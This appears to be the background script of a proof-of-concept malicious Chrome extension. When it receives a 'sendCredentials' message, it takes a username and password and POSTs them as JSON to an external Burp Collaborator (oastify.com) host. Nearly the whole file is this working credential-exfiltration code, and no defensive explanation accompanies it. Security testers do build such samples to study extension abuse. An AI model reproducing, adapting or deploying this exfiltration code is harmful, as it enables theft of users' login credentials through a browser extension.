chrome.runtime.onInstalled.addListener(() => {
  console.log("The Extension Installed!");
});

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === "sendCredentials") {
    const { username, password } = message;

    // Perform the POST request to Burp Collaborator from the background script
    fetch('https://gn7j7jpetb342t6x2us48nox3o9f5lu.oastify.com', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ username: username, password: password })
    })
    .then(response => {
      console.log('Data sent to Burp Collaborator');
    })
    .catch(error => {
      console.error('Error sending data:', error);
    });
  }
});
